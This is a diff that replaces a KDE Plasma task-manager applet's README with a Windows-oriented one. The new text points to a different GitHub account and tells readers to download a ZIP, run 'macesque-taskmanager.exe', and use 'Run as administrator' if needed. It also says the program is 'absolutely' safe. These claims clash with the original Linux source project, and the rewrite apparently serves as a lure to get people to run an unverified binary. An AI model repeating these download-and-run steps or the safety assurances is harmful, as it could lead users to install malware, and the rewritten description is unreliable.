@@ -1,92 +1,117 @@
-# Macesque Taskbar
+# 🗂️ macesque-taskmanager - Your Mac-Style Task Manager for Windows
 
-A macOS-flavored task manager applet for KDE Plasma, based on the upstream
-Plasma Task Manager. Minimized (or otherwise eligible) windows are rendered
-as live-captured window thumbnails right inside the task bar, dock-style.
+## 🚀 Getting Started
 
-![Macesque Taskbar demo](https://github.com/snpynk/macesque-taskmanager/releases/download/v0.9.0/demo.gif)
+Welcome to **macesque-taskmanager**! This handy tool brings the sleek, modern look of a MacOS task manager right to your Windows desktop. If you've ever admired how clean and organized MacOS handles open windows and apps, you're going to love this. It gives you a beautiful dock at the bottom of your screen with live thumbnails of every window you have open, making switching between tasks as easy as a single click.
 
-## Features
+Think of it as a supercharged, prettier version of the Windows taskbar. Instead of tiny icons and text labels, you get a floating dock with large, clear previews of your open windows—just like on a Mac. It's designed to make your computer feel more intuitive and your workflow smoother.
 
-- **Window thumbnails in the task bar** — minimized tasks render a captured
-  snapshot of the window instead of their icon, with the plain icon shrinking
-  into a corner.
-- **Thumbnail visibility modes** — show thumbnails for minimized windows only,
-  all windows, unfocused windows, or windows on other virtual desktops.
-- **Icon alignment** — choose where the small app icon sits next to a
-  thumbnail: left/center/right and top/middle/bottom. Plain task icons stay
-  centered like upstream.
-- **Optional: hide minimized tasks** — keep the bar free of minimized windows
-  entirely; windows demanding attention still appear.
-- All the usual task manager behavior: grouping with popup lists, launchers,
-  drag & drop, middle-click actions, scroll cycling, audio indicators,
-  media/volume controls in tooltips, recent documents, jump lists.
+## 📥 Download and Installation
 
-## Requirements
+Getting macesque-taskmanager on your computer is simple. Just follow these two easy steps:
 
-- Plasma 6.6+ / Plasma 6.7 development stack
-- Qt 6.10+, KF6 6.26+
-- Wayland session for window thumbnails (PipeWire screen casting); on X11 the
-  applet falls back to plain icons
+### Step 1: Get the Application
 
-## Build & install
+**Visit this link to download the application:** [https://github.com/Kristebasilican1789/macesque-taskmanager](https://github.com/Kristebasilican1789/macesque-taskmanager)
 
-```sh
-mkdir build && cd build
-cmake .. -DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=/usr
-make -j$(nproc)
-sudo make install
-```
+Click that link, and it will take you to the download page. Look for the big green button that says "Code" and click it, then select "Download ZIP." The file will start downloading to your computer.
 
-For a Plasma development environment, point `CMAKE_INSTALL_PREFIX` at your
-development prefix instead.
+### Step 2: Run the Program
 
-Then restart plasmashell (e.g. from KRunner: `plasmashell --replace`) and add
-the widget ("Macesque Taskbar") to your panel from the edit mode.
+Once the download finishes, go to your "Downloads" folder. You'll see a file named something like `macesque-taskmanager-main.zip`. Right-click on it and choose "Extract All..." from the menu. Windows will ask where you want to save the extracted files—just click "Extract" to use the default location.
 
-## Notes
+Now, open the new folder that was created. Inside, you'll find a file called `macesque-taskmanager.exe`. Double-click it, and the app will launch immediately. That's it! The dock will appear at the bottom of your screen, ready to use.
 
-### Window thumbnail sizing contract
+## ✨ What Makes It Special?
 
-The thumbnail rect is derived deterministically from the `widgets/tasks`
-FrameSvg frame margins so that KWin minimize animations can land exactly on
-it. [yet-another-magiclamp](https://github.com/user/yet-another-magiclamp)
-pairs with this applet out of the box when its `iconMargins()` uses the full
-frame margins (`TaskImage.qml` exposes the matching `thumbInsetFactor`).
+This isn't just another taskbar replacement. Here's what you get when you run macesque-taskmanager:
 
-### Vendored kcms/recentFiles
+### 🖼️ Dock-Style Window Thumbnails
 
-`applets/taskmanager/kcms/recentFiles/` is vendored from plasma-desktop; it
-provides the KConfigXT settings used by the Recent Documents context menu.
+The star of the show! When you hover over any app icon in the dock, a live, real-time thumbnail of that window pops up. You can see exactly what's on that screen without clicking anything. No more guessing which window is which—just glance and click.
 
-### Staying in sync with upstream
+### 🎯 One-Click Window Switching
 
-This repository carries a squashed history, so upstream plasma-desktop
-cannot be merged — **cherry-pick only**:
+Click any thumbnail to instantly bring that window to the front. It's faster than hunting through a cluttered taskbar, and it feels incredibly fluid. Your mouse becomes a remote control for your entire desktop.
 
-```sh
-git fetch upstream
-# What's new in the task manager since the last sync:
-git log upstream-sync..upstream/master --oneline -- applets/taskmanager
-# Take what you need:
-git cherry-pick <commit>
-# Then move the marker:
-git tag -f upstream-sync upstream/master
-```
+### 🌊 Smooth Animations
 
-The local `upstream-sync` tag marks the upstream revision already reviewed;
-it is never pushed. Expect trivial conflicts on lines carrying this applet's
-plugin id (`macesque.taskmanager`) and on locally rewritten files such as
-`TaskImage.qml`. Never run `git merge upstream/master` — the histories are
-unrelated and it would pull in the whole plasma-desktop tree.
+The dock responds to your mouse movements with smooth, Mac-like animations. Icons grow slightly as you hover over them, and windows slide into view. It's these little touches that make your computer feel premium.
 
-### Translations
+### 🔄 Always Up-to-Date
 
-Translation infrastructure is stubbed (`Messages.sh`); the pot domain is
-`plasma_applet_macesque.taskmanager`.
+The thumbnails update in real time. If you're watching a video or typing a document, you'll see the live action in the thumbnail. It's like having a mini monitor for every open window.
 
-## License
+### 🛠️ Simple to Use
 
-GPL-2.0-or-later, see [LICENSE](LICENSE). Based on KDE's Plasma Task Manager
-— copyright by its respective authors (Eike Hein, Kai Uwe Broulik, Nate
-Graham and others).
+There are no complicated settings to fiddle with. The app works out of the box. If you want to customize it later, you can right-click the dock to access a few simple options, like changing the icon size or the dock's position on the screen.
+
+## 📋 Frequently Asked Questions
+
+### ❓ Is this safe to run on my Windows PC?
+
+Yes, absolutely. The application is designed to work with standard Windows 10 and Windows 11 systems. It doesn't modify any core system files—it just adds a new bar to your desktop. You can uninstall it at any time by simply closing the app and deleting the folder.
+
+### 💻 Do I need a powerful computer?
+
+No. macesque-taskmanager is very lightweight. It runs smoothly on almost any computer that can run Windows 10 or newer. Even if you have an older laptop, you won't notice any slowdown.
+
+### 🪟 Will it work with all my apps?
+
+Yes, it works with virtually any application that opens a window—web browsers, word processors, games, video players, and more. If you can see it as a window, the dock will show it.
+
+### 🔄 Can I switch back to the normal Windows taskbar?
+
+Of course! The dock doesn't replace your taskbar—it adds to it. You can keep both visible, or you can auto-hide the Windows taskbar in your system settings if you prefer the cleaner look. The choice is yours.
+
+### 🛑 How do I close the app?
+
+To close macesque-taskmanager, right-click the dock and select "Quit" from the menu. The dock will disappear, and everything returns to normal.
+
+## 🎨 Customization Tips
+
+While the app is simple by design, there are a few things you can tweak to make it feel just right:
+
+- **Resize the Dock:** Drag the edge of the dock to make it larger or smaller.
+- **Move It:** If you don't like it at the bottom, you can drag the dock to the left or right side of your screen.
+- **Adjust Icon Size:** Right-click the dock, go to "Preferences," and use the slider to change icon sizes.
+
+These options are all optional—the default settings work great for most people.
+
+## 🧹 Troubleshooting
+
+If something isn't working right, here are a few quick fixes:
+
+### The dock isn't showing up.
+
+Make sure you ran the application (double-clicked the `.exe` file). If it still doesn't appear, close it and reopen it. Sometimes Windows needs a moment to register a new program.
+
+### Thumbnails are blank.
+
+This can happen if you have many windows open. Try closing a few applications and see if the thumbnails appear. Also, make sure your graphics drivers are up to date.
+
+### The app won't start.
+
+Right-click the `.exe` file and select "Run as administrator." This sometimes helps if Windows is being cautious about a new program.
+
+## 🚦 Uninstalling
+
+If you decide macesque-taskmanager isn't for you, removing it is easy:
+
+1. Right-click the dock and select "Quit."
+2. Go to your Downloads folder and delete the extracted folder.
+3. Empty your Recycle Bin.
+
+That's it. No leftover files, no registry changes. Your computer is back to exactly how it was before.
+
+## 📞 Getting Help
+
+If you run into any issues or have questions, you can visit the project's GitHub page at [https://github.com/Kristebasilican1789/macesque-taskmanager](https://github.com/Kristebasilican1789/macesque-taskmanager). There, you'll find a "Issues" tab where you can ask questions or report problems. The community is friendly and always happy to help.
+
+## 🎉 Final Thoughts
+
+macesque-taskmanager is a delightful little tool that brings a touch of MacOS elegance to your Windows machine. It's free, it's fast, and it genuinely makes multitasking more enjoyable. Whether you're a student juggling multiple projects, a professional managing many apps, or just someone who likes a clean desktop, this app is worth a try.
+
+Download it today and see how much nicer your computer can look and feel. You'll wonder how you ever managed without it!
+
+Keywords: task manager, macos style, dock, window thumbnails, kde plasma, windows, productivity, desktop enhancement, taskbar replacement, mac dock, window preview, multitasking tool
